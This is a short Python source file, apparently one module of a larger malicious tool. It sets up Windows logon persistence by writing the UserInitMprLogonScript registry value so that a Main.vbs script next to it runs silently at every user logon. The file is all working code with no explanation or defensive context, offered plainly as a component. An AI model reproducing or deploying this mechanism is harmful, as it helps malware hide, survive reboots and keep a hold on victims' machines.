import os,sys
from _winreg import *
class Startup():
	def __init__(self, _):
		self.Main()

	def Main(self):
		dirname = os.path.dirname(os.path.abspath(sys.argv[0]))
		root_key=OpenKey(HKEY_CURRENT_USER, r'Environment', 0, KEY_WRITE)
		SetValueEx(root_key,"UserInitMprLogonScript",0,REG_SZ,"wscript.exe " + dirname + "\\Main.vbs")
		CloseKey(root_key)
